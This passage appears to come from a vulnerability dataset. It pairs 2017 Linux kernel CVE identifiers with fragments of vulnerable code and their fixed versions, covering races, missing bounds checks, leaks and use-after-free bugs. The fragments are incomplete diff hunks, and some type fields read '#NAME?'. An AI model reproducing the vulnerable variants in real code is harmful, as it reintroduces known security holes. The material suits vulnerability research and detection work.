 NETLINK_CB(in_skb).portid, nlh->nlmsg_seq);
	}
 if (err < 0)
 goto errout_free;

"
2017,Overflow ,CVE-2017-12762,,
2017,DoS ,CVE-2017-12193," if ((edit->segment_cache[ASSOC_ARRAY_FAN_OUT] ^ base_seg) == 0)
 goto all_leaves_cluster_together;

 /* Otherwise we can just insert a new node ahead of the old
		 * one.





 */
 goto present_leaves_cluster_but_not_new_leaf;
	}

split_node:
 pr_devel(""split node\n"");

 /* We need to split the current node; we know that the node doesn't
	 * simply contain a full set of leaves that cluster together (it
	 * contains meta pointers and/or non-clustering leaves).




	 *
	 * We need to expel at least two leaves out of a set consisting of the
	 * leaves in the node and the new leaf.

	 *
	 * We need a new node (n0) to replace the current one and a new node to
	 * take the expelled nodes (n1).
 pr_devel(""<--%s() = ok [split node]\n"", __func__);
 return true;

present_leaves_cluster_but_not_new_leaf:
 /* All the old leaves cluster in the same slot, but the new leaf wants
	 * to go into a different slot, so we create a new node to hold the new
	 * leaf and a pointer to a new node holding all the old leaves.
 */
 pr_devel(""present leaves cluster but not new leaf\n"");

	new_n0->back_pointer = node->back_pointer;
	new_n0->parent_slot = node->parent_slot;
	new_n0->nr_leaves_on_branch = node->nr_leaves_on_branch;
	new_n1->back_pointer = assoc_array_node_to_ptr(new_n0);
	new_n1->parent_slot = edit->segment_cache[0];
	new_n1->nr_leaves_on_branch = node->nr_leaves_on_branch;
	edit->adjust_count_on = new_n0;

 for (i = 0; i < ASSOC_ARRAY_FAN_OUT; i++)
		new_n1->slots[i] = node->slots[i];

	new_n0->slots[edit->segment_cache[0]] = assoc_array_node_to_ptr(new_n0);
	edit->leaf_p = &new_n0->slots[edit->segment_cache[ASSOC_ARRAY_FAN_OUT]];

	edit->set[0].ptr = &assoc_array_ptr_to_node(node->back_pointer)->slots[node->parent_slot];
	edit->set[0].to = assoc_array_node_to_ptr(new_n0);
	edit->excised_meta[0] = assoc_array_node_to_ptr(node);
 pr_devel(""<--%s() = ok [insert node before]\n"", __func__);
 return true;

all_leaves_cluster_together:
 /* All the leaves, new and old, want to cluster together in this node
	 * in the same slot, so we have to replace this node with a shortcut to
"," if ((edit->segment_cache[ASSOC_ARRAY_FAN_OUT] ^ base_seg) == 0)
 goto all_leaves_cluster_together;

 /* Otherwise all the old leaves cluster in the same slot, but
		 * the new leaf wants to go into a different slot - so we
		 * create a new node (n0) to hold the new leaf and a pointer to
		 * a new node (n1) holding all the old leaves.
		 *
		 * This can be done by falling through to the node splitting
		 * path.
 */
 pr_devel(""present leaves cluster but not new leaf\n"");
	}

split_node:
 pr_devel(""split node\n"");

 /* We need to split the current node.  The node must contain anything
	 * from a single leaf (in the one leaf case, this leaf will cluster
	 * with the new leaf) and the rest meta-pointers, to all leaves, some
	 * of which may cluster.
	 *
	 * It won't contain the case in which all the current leaves plus the
	 * new leaves want to cluster in the same slot.
	 *
	 * We need to expel at least two leaves out of a set consisting of the
	 * leaves in the node and the new leaf.  The current meta pointers can
	 * just be copied as they shouldn't cluster with any of the leaves.
	 *
	 * We need a new node (n0) to replace the current one and a new node to
	 * take the expelled nodes (n1).
 pr_devel(""<--%s() = ok [split node]\n"", __func__);
 return true;




























all_leaves_cluster_together:
 /* All the leaves, new and old, want to cluster together in this node
	 * in the same slot, so we have to replace this node with a shortcut to
"
2017,DoS ,CVE-2017-12192,"
	key = key_ref_to_ptr(key_ref);






 /* see if we can read it directly */
	ret = key_permission(key_ref, KEY_NEED_READ);
 if (ret == 0)
","
	key = key_ref_to_ptr(key_ref);

 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags)) {
		ret = -ENOKEY;
 goto error2;
	}

 /* see if we can read it directly */
	ret = key_permission(key_ref, KEY_NEED_READ);
 if (ret == 0)
"
2017,,CVE-2017-12190,"		offset = offset_in_page(uaddr);
 for (j = cur_page; j < page_limit; j++) {
 unsigned int bytes = PAGE_SIZE - offset;


 if (len <= 0)
 break;
					    bytes)
 break;








			len -= bytes;
			offset = 0;
		}
","		offset = offset_in_page(uaddr);
 for (j = cur_page; j < page_limit; j++) {
 unsigned int bytes = PAGE_SIZE - offset;
 unsigned short prev_bi_vcnt = bio->bi_vcnt;

 if (len <= 0)
 break;
					    bytes)
 break;

 /*
			 * check if vector was merged with previous
			 * drop page reference if needed
 */
 if (bio->bi_vcnt == prev_bi_vcnt)
 put_page(pages[j]);

			len -= bytes;
			offset = 0;
		}
"
2017,DoS Exec Code Dir. Trav. ,CVE-2017-12188,,
2017,DoS ,CVE-2017-12168,"
			idx = ARMV8_PMU_CYCLE_IDX;
		} else {
 BUG();
		}






	} else if (r->CRn == 14 && (r->CRm & 12) == 8) {
 /* PMEVCNTRn_EL0 */
 if (pmu_access_event_counter_el0_disabled(vcpu))
 return false;

		idx = ((r->CRm & 3) << 3) | (r->Op2 & 7);
	} else {
 BUG();
	}

 if (!pmu_counter_idx_valid(vcpu, idx))
","
			idx = ARMV8_PMU_CYCLE_IDX;
		} else {
 return false;
		}
	} else if (r->CRn == 0 && r->CRm == 9) {
 /* PMCCNTR */
 if (pmu_access_event_counter_el0_disabled(vcpu))
 return false;

		idx = ARMV8_PMU_CYCLE_IDX;
	} else if (r->CRn == 14 && (r->CRm & 12) == 8) {
 /* PMEVCNTRn_EL0 */
 if (pmu_access_event_counter_el0_disabled(vcpu))
 return false;

		idx = ((r->CRm & 3) << 3) | (r->Op2 & 7);
	} else {
 return false;
	}

 if (!pmu_counter_idx_valid(vcpu, idx))
"
2017,,CVE-2017-12154," if (exec_control & CPU_BASED_TPR_SHADOW) {
 vmcs_write64(VIRTUAL_APIC_PAGE_ADDR, -1ull);
 vmcs_write32(TPR_THRESHOLD, vmcs12->tpr_threshold);





	}

 /*
"," if (exec_control & CPU_BASED_TPR_SHADOW) {
 vmcs_write64(VIRTUAL_APIC_PAGE_ADDR, -1ull);
 vmcs_write32(TPR_THRESHOLD, vmcs12->tpr_threshold);
	} else {
#ifdef CONFIG_X86_64
		exec_control |= CPU_BASED_CR8_LOAD_EXITING |
				CPU_BASED_CR8_STORE_EXITING;
#endif
	}

 /*
"
2017,,CVE-2017-12153,,
2017,#NAME?,CVE-2017-12146," const char *buf, size_t count)
{
 struct platform_device *pdev = to_platform_device(dev);
 char *driver_override, *old = pdev->driver_override, *cp;

 if (count > PATH_MAX)
 return -EINVAL;
 if (cp)
		*cp = '\0';



 if (strlen(driver_override)) {
		pdev->driver_override = driver_override;
	} else {
 kfree(driver_override);
		pdev->driver_override = NULL;
	}


 kfree(old);

 struct device_attribute *attr, char *buf)
{
 struct platform_device *pdev = to_platform_device(dev);


 return sprintf(buf, ""%s\n"", pdev->driver_override);



}
static DEVICE_ATTR_RW(driver_override);

"," const char *buf, size_t count)
{
 struct platform_device *pdev = to_platform_device(dev);
 char *driver_override, *old, *cp;

 if (count > PATH_MAX)
 return -EINVAL;
 if (cp)
		*cp = '\0';

 device_lock(dev);
	old = pdev->driver_override;
 if (strlen(driver_override)) {
		pdev->driver_override = driver_override;
	} else {
 kfree(driver_override);
		pdev->driver_override = NULL;
	}
 device_unlock(dev);

 kfree(old);

 struct device_attribute *attr, char *buf)
{
 struct platform_device *pdev = to_platform_device(dev);
 ssize_t len;

 device_lock(dev);
	len = sprintf(buf, ""%s\n"", pdev->driver_override);
 device_unlock(dev);
 return len;
}
static DEVICE_ATTR_RW(driver_override);

"
2017,DoS ,CVE-2017-11600,,
2017,Overflow +Priv ,CVE-2017-11473,,
2017,Bypass +Info ,CVE-2017-11472,"void acpi_ns_terminate(void)
{
	acpi_status status;



 ACPI_FUNCTION_TRACE(ns_terminate);

#ifdef ACPI_EXEC_APP
	{
 union acpi_operand_object *prev;
 union acpi_operand_object *next;

 /* Delete any module-level code blocks */

		next = acpi_gbl_module_code_list;
 while (next) {
			prev = next;
			next = next->method.mutex;
			prev->method.mutex = NULL;	/* Clear the Mutex (cheated) field */
 acpi_ut_remove_reference(prev);
		}
	}
#endif

 /*
	 * Free the entire namespace -- all nodes and all objects
","void acpi_ns_terminate(void)
{
	acpi_status status;
 union acpi_operand_object *prev;
 union acpi_operand_object *next;

 ACPI_FUNCTION_TRACE(ns_terminate);

 /* Delete any module-level code blocks */




	next = acpi_gbl_module_code_list;
 while (next) {
		prev = next;
		next = next->method.mutex;
		prev->method.mutex = NULL;	/* Clear the Mutex (cheated) field */
 acpi_ut_remove_reference(prev);



	}


 /*
	 * Free the entire namespace -- all nodes and all objects
"
2017,DoS ,CVE-2017-11176,"
			timeo = MAX_SCHEDULE_TIMEOUT;
			ret = netlink_attachskb(sock, nc, &timeo, NULL);
 if (ret == 1)

 goto retry;

 if (ret) {
				sock = NULL;
				nc = NULL;
","
			timeo = MAX_SCHEDULE_TIMEOUT;
			ret = netlink_attachskb(sock, nc, &timeo, NULL);
 if (ret == 1) {
				sock = NULL;
 goto retry;
			}
 if (ret) {
				sock = NULL;
				nc = NULL;
"
2017,#NAME?,CVE-2017-10911,"static void make_response(struct xen_blkif_ring *ring, u64 id,
 unsigned short op, int st)
{
 struct blkif_response  resp;
 unsigned long     flags;
 union blkif_back_rings *blk_rings;
 int notify;

	resp.id        = id;
	resp.operation = op;
	resp.status    = st;

 spin_lock_irqsave(&ring->blk_ring_lock, flags);
	blk_rings = &ring->blk_rings;
 /* Place on the response ring for the relevant domain. */
 switch (ring->blkif->blk_protocol) {
 case BLKIF_PROTOCOL_NATIVE:
 memcpy(RING_GET_RESPONSE(&blk_rings->native, blk_rings->native.rsp_prod_pvt),
        &resp, sizeof(resp));
 break;
 case BLKIF_PROTOCOL_X86_32:
 memcpy(RING_GET_RESPONSE(&blk_rings->x86_32, blk_rings->x86_32.rsp_prod_pvt),
        &resp, sizeof(resp));
 break;
 case BLKIF_PROTOCOL_X86_64:
 memcpy(RING_GET_RESPONSE(&blk_rings->x86_64, blk_rings->x86_64.rsp_prod_pvt),
        &resp, sizeof(resp));
 break;
 default:
 BUG();
	}





	blk_rings->common.rsp_prod_pvt++;
 RING_PUSH_RESPONSES_AND_CHECK_NOTIFY(&blk_rings->common, notify);
 spin_unlock_irqrestore(&ring->blk_ring_lock, flags);
struct blkif_common_request {
 char dummy;
};
struct blkif_common_response {
 char dummy;
};

struct blkif_x86_32_request_rw {
 uint8_t        nr_segments;  /* number of segments                   */
	} u;
} __attribute__((__packed__));

/* i386 protocol version */
#pragma pack(push, 4)
struct blkif_x86_32_response {
 uint64_t        id;              /* copied from request */
 uint8_t         operation;       /* copied from request */
 int16_t         status;          /* BLKIF_RSP_???       */
};
#pragma pack(pop)
/* x86_64 protocol version */

struct blkif_x86_64_request_rw {
	} u;
} __attribute__((__packed__));

struct blkif_x86_64_response {
 uint64_t __attribute__((__aligned__(8))) id;
 uint8_t         operation;       /* copied from request */
 int16_t         status;          /* BLKIF_RSP_???       */
};

DEFINE_RING_TYPES(blkif_common, struct blkif_common_request,
 struct blkif_common_response);
DEFINE_RING_TYPES(blkif_x86_32, struct blkif_x86_32_request,
 struct blkif_x86_32_response);
DEFINE_RING_TYPES(blkif_x86_64, struct blkif_x86_64_request,
 struct blkif_x86_64_response);

union blkif_back_rings {
 struct blkif_back_ring        native;
","static void make_response(struct xen_blkif_ring *ring, u64 id,
 unsigned short op, int st)
{
 struct blkif_response *resp;
 unsigned long     flags;
 union blkif_back_rings *blk_rings;
 int notify;





 spin_lock_irqsave(&ring->blk_ring_lock, flags);
	blk_rings = &ring->blk_rings;
 /* Place on the response ring for the relevant domain. */
 switch (ring->blkif->blk_protocol) {
 case BLKIF_PROTOCOL_NATIVE:
 resp = RING_GET_RESPONSE(&blk_rings->native,
 			 blk_rings->native.rsp_prod_pvt);
 break;
 case BLKIF_PROTOCOL_X86_32:
 resp = RING_GET_RESPONSE(&blk_rings->x86_32,
 			 blk_rings->x86_32.rsp_prod_pvt);
 break;
 case BLKIF_PROTOCOL_X86_64:
 resp = RING_GET_RESPONSE(&blk_rings->x86_64,
 			 blk_rings->x86_64.rsp_prod_pvt);
 break;
 default:
 BUG();
	}

	resp->id        = id;
	resp->operation = op;
	resp->status    = st;

	blk_rings->common.rsp_prod_pvt++;
 RING_PUSH_RESPONSES_AND_CHECK_NOTIFY(&blk_rings->common, notify);
 spin_unlock_irqrestore(&ring->blk_ring_lock, flags);
struct blkif_common_request {
 char dummy;
};

/* i386 protocol version */


struct blkif_x86_32_request_rw {
 uint8_t        nr_segments;  /* number of segments                   */
	} u;
} __attribute__((__packed__));









/* x86_64 protocol version */

struct blkif_x86_64_request_rw {
	} u;
} __attribute__((__packed__));







DEFINE_RING_TYPES(blkif_common, struct blkif_common_request,
 struct blkif_response);
DEFINE_RING_TYPES(blkif_x86_32, struct blkif_x86_32_request,
 struct blkif_response __packed);
DEFINE_RING_TYPES(blkif_x86_64, struct blkif_x86_64_request,
 struct blkif_response);

union blkif_back_rings {
 struct blkif_back_ring        native;
"
2017,DoS ,CVE-2017-10810," return -ENOMEM;
	size = roundup(size, PAGE_SIZE);
	ret = drm_gem_object_init(vgdev->ddev, &bo->gem_base, size);
 if (ret != 0)

 return ret;

	bo->dumb = false;
 virtio_gpu_init_ttm_placement(bo, pinned);

"," return -ENOMEM;
	size = roundup(size, PAGE_SIZE);
	ret = drm_gem_object_init(vgdev->ddev, &bo->gem_base, size);
 if (ret != 0) {
 kfree(bo);
 return ret;
	}
	bo->dumb = false;
 virtio_gpu_init_ttm_placement(bo, pinned);

"
2017,#NAME?,CVE-2017-10663," struct f2fs_super_block *raw_super = F2FS_RAW_SUPER(sbi);
 struct f2fs_checkpoint *ckpt = F2FS_CKPT(sbi);
 unsigned int ovp_segments, reserved_segments;



	total = le32_to_cpu(raw_super->segment_count);
	fsmeta = le32_to_cpu(raw_super->segment_count_ckpt);
 return 1;
	}















 if (unlikely(f2fs_cp_error(sbi))) {
 f2fs_msg(sbi->sb, KERN_ERR, ""A bug case: need to run fsck"");
 return 1;
"," struct f2fs_super_block *raw_super = F2FS_RAW_SUPER(sbi);
 struct f2fs_checkpoint *ckpt = F2FS_CKPT(sbi);
 unsigned int ovp_segments, reserved_segments;
 unsigned int main_segs, blocks_per_seg;
 int i;

	total = le32_to_cpu(raw_super->segment_count);
	fsmeta = le32_to_cpu(raw_super->segment_count_ckpt);
 return 1;
	}

	main_segs = le32_to_cpu(raw_super->segment_count_main);
	blocks_per_seg = sbi->blocks_per_seg;

 for (i = 0; i < NR_CURSEG_NODE_TYPE; i++) {
 if (le32_to_cpu(ckpt->cur_node_segno[i]) >= main_segs ||
 le16_to_cpu(ckpt->cur_node_blkoff[i]) >= blocks_per_seg)
 return 1;
	}
 for (i = 0; i < NR_CURSEG_DATA_TYPE; i++) {
 if (le32_to_cpu(ckpt->cur_data_segno[i]) >= main_segs ||
 le16_to_cpu(ckpt->cur_data_blkoff[i]) >= blocks_per_seg)
 return 1;
	}

 if (unlikely(f2fs_cp_error(sbi))) {
 f2fs_msg(sbi->sb, KERN_ERR, ""A bug case: need to run fsck"");
 return 1;
"
2017,#NAME?,CVE-2017-10662," return 1;
	}








 /* check CP/SIT/NAT/SSA/MAIN_AREA area boundary */
 if (sanity_check_area_boundary(sbi, bh))
 return 1;
#define SIT_VBLOCK_MAP_SIZE 64
#define SIT_ENTRY_PER_BLOCK (PAGE_SIZE / sizeof(struct f2fs_sit_entry))







/*
 * Note that f2fs_sit_entry->vblocks has the following bit-field information.
 * [15:10] : allocation type such as CURSEG_XXXX_TYPE
"," return 1;
	}

 if (le32_to_cpu(raw_super->segment_count) > F2FS_MAX_SEGMENT) {
 f2fs_msg(sb, KERN_INFO,
 ""Invalid segment count (%u)"",
 le32_to_cpu(raw_super->segment_count));
 return 1;
	}

 /* check CP/SIT/NAT/SSA/MAIN_AREA area boundary */
 if (sanity_check_area_boundary(sbi, bh))
 return 1;
#define SIT_VBLOCK_MAP_SIZE 64
#define SIT_ENTRY_PER_BLOCK (PAGE_SIZE / sizeof(struct f2fs_sit_entry))

/*
 * F2FS uses 4 bytes to represent block address. As a result, supported size of
 * disk is 16 TB and it equals to 16 * 1024 * 1024 / 2 segments.
 */
#define F2FS_MAX_SEGMENT       ((16 * 1024 * 1024) / 2)

/*
 * Note that f2fs_sit_entry->vblocks has the following bit-field information.
 * [15:10] : allocation type such as CURSEG_XXXX_TYPE
"
2017,DoS +Priv ,CVE-2017-10661," short unsigned settime_flags;	/* to show in fdinfo */
 struct rcu_head rcu;
 struct list_head clist;

 bool might_cancel;
};

 rcu_read_unlock();
}

static void timerfd_remove_cancel(struct timerfd_ctx *ctx)
{
 if (ctx->might_cancel) {
		ctx->might_cancel = false;
	}
}








static bool timerfd_canceled(struct timerfd_ctx *ctx)
{
 if (!ctx->might_cancel || ctx->moffs != KTIME_MAX)

static void timerfd_setup_cancel(struct timerfd_ctx *ctx, int flags)
{

 if ((ctx->clockid == CLOCK_REALTIME ||
	     ctx->clockid == CLOCK_REALTIME_ALARM) &&
	    (flags & TFD_TIMER_ABSTIME) && (flags & TFD_TIMER_CANCEL_ON_SET)) {
 list_add_rcu(&ctx->clist, &cancel_list);
 spin_unlock(&cancel_lock);
		}
	} else if (ctx->might_cancel) {
 timerfd_remove_cancel(ctx);
	}

}

static ktime_t timerfd_get_remaining(struct timerfd_ctx *ctx)
 return -ENOMEM;

 init_waitqueue_head(&ctx->wqh);

	ctx->clockid = clockid;

 if (isalarm(ctx))
"," short unsigned settime_flags;	/* to show in fdinfo */
 struct rcu_head rcu;
 struct list_head clist;
 spinlock_t cancel_lock;
 bool might_cancel;
};

 rcu_read_unlock();
}

static void __timerfd_remove_cancel(struct timerfd_ctx *ctx)
{
 if (ctx->might_cancel) {
		ctx->might_cancel = false;
	}
}

static void timerfd_remove_cancel(struct timerfd_ctx *ctx)
{
 spin_lock(&ctx->cancel_lock);
 __timerfd_remove_cancel(ctx);
 spin_unlock(&ctx->cancel_lock);
}

static bool timerfd_canceled(struct timerfd_ctx *ctx)
{
 if (!ctx->might_cancel || ctx->moffs != KTIME_MAX)

static void timerfd_setup_cancel(struct timerfd_ctx *ctx, int flags)
{
 spin_lock(&ctx->cancel_lock);
 if ((ctx->clockid == CLOCK_REALTIME ||
	     ctx->clockid == CLOCK_REALTIME_ALARM) &&
	    (flags & TFD_TIMER_ABSTIME) && (flags & TFD_TIMER_CANCEL_ON_SET)) {
 list_add_rcu(&ctx->clist, &cancel_list);
 spin_unlock(&cancel_lock);
		}
	} else {
 __timerfd_remove_cancel(ctx);
	}
 spin_unlock(&ctx->cancel_lock);
}

static ktime_t timerfd_get_remaining(struct timerfd_ctx *ctx)
 return -ENOMEM;

 init_waitqueue_head(&ctx->wqh);
 spin_lock_init(&ctx->cancel_lock);
	ctx->clockid = clockid;

 if (isalarm(ctx))
"
2017,DoS ,CVE-2017-9986,,
2017,DoS ,CVE-2017-9985," unsigned long flags;
 struct snd_msndmidi *mpu = mpuv;
 void *pwMIDQData = mpu->dev->mappedbase + MIDQ_DATA_BUFF;


 spin_lock_irqsave(&mpu->input_lock, flags);
 while (readw(mpu->dev->MIDQ + JQS_wTail) !=
 readw(mpu->dev->MIDQ + JQS_wHead)) {
		u16 wTmp, val;
		val = readw(pwMIDQData + 2 * readw(mpu->dev->MIDQ + JQS_wHead));

 if (test_bit(MSNDMIDI_MODE_BIT_INPUT_TRIGGER,
				     &mpu->mode))
 snd_rawmidi_receive(mpu->substream_input,
						    (unsigned char *)&val, 1);

		wTmp = readw(mpu->dev->MIDQ + JQS_wHead) + 1;
 if (wTmp > readw(mpu->dev->MIDQ + JQS_wSize))
 writew(0,  mpu->dev->MIDQ + JQS_wHead);
 else
 writew(wTmp,  mpu->dev->MIDQ + JQS_wHead);
	}

 spin_unlock_irqrestore(&mpu->input_lock, flags);
}
EXPORT_SYMBOL(snd_msndmidi_input_read);
{
 struct snd_msnd *chip = dev_id;
 void *pwDSPQData = chip->mappedbase + DSPQ_DATA_BUFF;


 /* Send ack to DSP */
 /* inb(chip->io + HP_RXL); */

 /* Evaluate queued DSP messages */
 while (readw(chip->DSPQ + JQS_wTail) != readw(chip->DSPQ + JQS_wHead)) {
		u16 wTmp;

 snd_msnd_eval_dsp_msg(chip,
 readw(pwDSPQData + 2 * readw(chip->DSPQ + JQS_wHead)));

		wTmp = readw(chip->DSPQ + JQS_wHead) + 1;
 if (wTmp > readw(chip->DSPQ + JQS_wSize))
 writew(0, chip->DSPQ + JQS_wHead);
 else
 writew(wTmp, chip->DSPQ + JQS_wHead);
	}

 /* Send ack to DSP */
 inb(chip->io + HP_RXL);
 return IRQ_HANDLED;
"," unsigned long flags;
 struct snd_msndmidi *mpu = mpuv;
 void *pwMIDQData = mpu->dev->mappedbase + MIDQ_DATA_BUFF;
	u16 head, tail, size;

 spin_lock_irqsave(&mpu->input_lock, flags);
	head = readw(mpu->dev->MIDQ + JQS_wHead);
	tail = readw(mpu->dev->MIDQ + JQS_wTail);
	size = readw(mpu->dev->MIDQ + JQS_wSize);
 if (head > size || tail > size)
 goto out;
 while (head != tail) {
 unsigned char val = readw(pwMIDQData + 2 * head);

 if (test_bit(MSNDMIDI_MODE_BIT_INPUT_TRIGGER, &mpu->mode))
 snd_rawmidi_receive(mpu->substream_input, &val, 1);
 if (++head > size)
			head = 0;
 writew(head, mpu->dev->MIDQ + JQS_wHead);


	}
 out:
 spin_unlock_irqrestore(&mpu->input_lock, flags);
}
EXPORT_SYMBOL(snd_msndmidi_input_read);
{
 struct snd_msnd *chip = dev_id;
 void *pwDSPQData = chip->mappedbase + DSPQ_DATA_BUFF;
	u16 head, tail, size;

 /* Send ack to DSP */
 /* inb(chip->io + HP_RXL); */

 /* Evaluate queued DSP messages */
	head = readw(chip->DSPQ + JQS_wHead);
	tail = readw(chip->DSPQ + JQS_wTail);
	size = readw(chip->DSPQ + JQS_wSize);
 if (head > size || tail > size)
 goto out;
 while (head != tail) {
 snd_msnd_eval_dsp_msg(chip, readw(pwDSPQData + 2 * head));
 if (++head > size)
			head = 0;
 writew(head, chip->DSPQ + JQS_wHead);

	}
 out:
 /* Send ack to DSP */
 inb(chip->io + HP_RXL);
 return IRQ_HANDLED;
"
2017,DoS ,CVE-2017-9984," unsigned long flags;
 struct snd_msndmidi *mpu = mpuv;
 void *pwMIDQData = mpu->dev->mappedbase + MIDQ_DATA_BUFF;


 spin_lock_irqsave(&mpu->input_lock, flags);
 while (readw(mpu->dev->MIDQ + JQS_wTail) !=
 readw(mpu->dev->MIDQ + JQS_wHead)) {
		u16 wTmp, val;
		val = readw(pwMIDQData + 2 * readw(mpu->dev->MIDQ + JQS_wHead));

 if (test_bit(MSNDMIDI_MODE_BIT_INPUT_TRIGGER,
				     &mpu->mode))
 snd_rawmidi_receive(mpu->substream_input,
						    (unsigned char *)&val, 1);

		wTmp = readw(mpu->dev->MIDQ + JQS_wHead) + 1;
 if (wTmp > readw(mpu->dev->MIDQ + JQS_wSize))
 writew(0,  mpu->dev->MIDQ + JQS_wHead);
 else
 writew(wTmp,  mpu->dev->MIDQ + JQS_wHead);
	}

 spin_unlock_irqrestore(&mpu->input_lock, flags);
}
EXPORT_SYMBOL(snd_msndmidi_input_read);
{
 struct snd_msnd *chip = dev_id;
 void *pwDSPQData = chip->mappedbase + DSPQ_DATA_BUFF;


 /* Send ack to DSP */
 /* inb(chip->io + HP_RXL); */

 /* Evaluate queued DSP messages */
 while (readw(chip->DSPQ + JQS_wTail) != readw(chip->DSPQ + JQS_wHead)) {
		u16 wTmp;

 snd_msnd_eval_dsp_msg(chip,
 readw(pwDSPQData + 2 * readw(chip->DSPQ + JQS_wHead)));

		wTmp = readw(chip->DSPQ + JQS_wHead) + 1;
 if (wTmp > readw(chip->DSPQ + JQS_wSize))
 writew(0, chip->DSPQ + JQS_wHead);
 else
 writew(wTmp, chip->DSPQ + JQS_wHead);
	}

 /* Send ack to DSP */
 inb(chip->io + HP_RXL);
 return IRQ_HANDLED;
"," unsigned long flags;
 struct snd_msndmidi *mpu = mpuv;
 void *pwMIDQData = mpu->dev->mappedbase + MIDQ_DATA_BUFF;
	u16 head, tail, size;

 spin_lock_irqsave(&mpu->input_lock, flags);
	head = readw(mpu->dev->MIDQ + JQS_wHead);
	tail = readw(mpu->dev->MIDQ + JQS_wTail);
	size = readw(mpu->dev->MIDQ + JQS_wSize);
 if (head > size || tail > size)
 goto out;
 while (head != tail) {
 unsigned char val = readw(pwMIDQData + 2 * head);

 if (test_bit(MSNDMIDI_MODE_BIT_INPUT_TRIGGER, &mpu->mode))
 snd_rawmidi_receive(mpu->substream_input, &val, 1);
 if (++head > size)
			head = 0;
 writew(head, mpu->dev->MIDQ + JQS_wHead);


	}
 out:
 spin_unlock_irqrestore(&mpu->input_lock, flags);
}
EXPORT_SYMBOL(snd_msndmidi_input_read);
{
 struct snd_msnd *chip = dev_id;
 void *pwDSPQData = chip->mappedbase + DSPQ_DATA_BUFF;
	u16 head, tail, size;

 /* Send ack to DSP */
 /* inb(chip->io + HP_RXL); */

 /* Evaluate queued DSP messages */
	head = readw(chip->DSPQ + JQS_wHead);
	tail = readw(chip->DSPQ + JQS_wTail);
	size = readw(chip->DSPQ + JQS_wSize);
 if (head > size || tail > size)
 goto out;
 while (head != tail) {
 snd_msnd_eval_dsp_msg(chip, readw(pwDSPQData + 2 * head));
 if (++head > size)
			head = 0;
 writew(head, chip->DSPQ + JQS_wHead);

	}
 out:
 /* Send ack to DSP */
 inb(chip->io + HP_RXL);
 return IRQ_HANDLED;
"
2017,#NAME?,CVE-2017-9605," struct ttm_object_file *tfile = vmw_fpriv(file_priv)->tfile;
 int ret;
 uint32_t size;
 uint32_t backup_handle;

 if (req->multisample_count != 0)
 return -EINVAL;
		ret = vmw_user_dmabuf_lookup(tfile, req->buffer_handle,
					     &res->backup,
					     &user_srf->backup_base);
 if (ret == 0 && res->backup->base.num_pages * PAGE_SIZE <
		    res->backup_size) {
 DRM_ERROR(""Surface backup buffer is too small.\n"");
 vmw_dmabuf_unreference(&res->backup);
			ret = -EINVAL;
 goto out_unlock;




		}
	} else if (req->drm_surface_flags & drm_vmw_surface_flag_create_buffer)
		ret = vmw_user_dmabuf_alloc(dev_priv, tfile,
"," struct ttm_object_file *tfile = vmw_fpriv(file_priv)->tfile;
 int ret;
 uint32_t size;
 uint32_t backup_handle = 0;

 if (req->multisample_count != 0)
 return -EINVAL;
		ret = vmw_user_dmabuf_lookup(tfile, req->buffer_handle,
					     &res->backup,
					     &user_srf->backup_base);
 if (ret == 0) {
 if (res->backup->base.num_pages * PAGE_SIZE <
			    res->backup_size) {
 DRM_ERROR(""Surface backup buffer is too small.\n"");
 vmw_dmabuf_unreference(&res->backup);
				ret = -EINVAL;
 goto out_unlock;
			} else {
				backup_handle = req->buffer_handle;
			}
		}
	} else if (req->drm_surface_flags & drm_vmw_surface_flag_create_buffer)
		ret = vmw_user_dmabuf_alloc(dev_priv, tfile,
"
2017,DoS ,CVE-2017-9242," */
			alloclen += sizeof(struct frag_hdr);






 if (transhdrlen) {
				skb = sock_alloc_send_skb(sk,
						alloclen + hh_len,
				data += fraggap;
 pskb_trim_unique(skb_prev, maxfraglen);
			}
			copy = datalen - transhdrlen - fraggap;

 if (copy < 0) {
				err = -EINVAL;
 kfree_skb(skb);
 goto error;
			} else if (copy > 0 && getfrag(from, data + transhdrlen, offset, copy, fraggap, skb) < 0) {
				err = -EFAULT;
 kfree_skb(skb);
 goto error;
"," */
			alloclen += sizeof(struct frag_hdr);

			copy = datalen - transhdrlen - fraggap;
 if (copy < 0) {
				err = -EINVAL;
 goto error;
			}
 if (transhdrlen) {
				skb = sock_alloc_send_skb(sk,
						alloclen + hh_len,
				data += fraggap;
 pskb_trim_unique(skb_prev, maxfraglen);
			}
 if (copy > 0 &&
 getfrag(from, data + transhdrlen, offset,
				    copy, fraggap, skb) < 0) {




				err = -EFAULT;
 kfree_skb(skb);
 goto error;
"
2017,DoS ,CVE-2017-9211," return 0;
}







































static void crypto_skcipher_exit_tfm(struct crypto_tfm *tfm)
{
 struct crypto_skcipher *skcipher = __crypto_skcipher_cast(tfm);
	    tfm->__crt_alg->cra_type == &crypto_givcipher_type)
 return crypto_init_skcipher_ops_ablkcipher(tfm);

	skcipher->setkey = alg->setkey;
	skcipher->encrypt = alg->encrypt;
	skcipher->decrypt = alg->decrypt;
	skcipher->ivsize = alg->ivsize;
"," return 0;
}

static int skcipher_setkey_unaligned(struct crypto_skcipher *tfm,
 const u8 *key, unsigned int keylen)
{
 unsigned long alignmask = crypto_skcipher_alignmask(tfm);
 struct skcipher_alg *cipher = crypto_skcipher_alg(tfm);
	u8 *buffer, *alignbuffer;
 unsigned long absize;
 int ret;

	absize = keylen + alignmask;
	buffer = kmalloc(absize, GFP_ATOMIC);
 if (!buffer)
 return -ENOMEM;

	alignbuffer = (u8 *)ALIGN((unsigned long)buffer, alignmask + 1);
 memcpy(alignbuffer, key, keylen);
	ret = cipher->setkey(tfm, alignbuffer, keylen);
 kzfree(buffer);
 return ret;
}

static int skcipher_setkey(struct crypto_skcipher *tfm, const u8 *key,
 unsigned int keylen)
{
 struct skcipher_alg *cipher = crypto_skcipher_alg(tfm);
 unsigned long alignmask = crypto_skcipher_alignmask(tfm);

 if (keylen < cipher->min_keysize || keylen > cipher->max_keysize) {
 crypto_skcipher_set_flags(tfm, CRYPTO_TFM_RES_BAD_KEY_LEN);
 return -EINVAL;
	}

 if ((unsigned long)key & alignmask)
 return skcipher_setkey_unaligned(tfm, key, keylen);

 return cipher->setkey(tfm, key, keylen);
}

static void crypto_skcipher_exit_tfm(struct crypto_tfm *tfm)
{
 struct crypto_skcipher *skcipher = __crypto_skcipher_cast(tfm);
	    tfm->__crt_alg->cra_type == &crypto_givcipher_type)
 return crypto_init_skcipher_ops_ablkcipher(tfm);

	skcipher->setkey = skcipher_setkey;
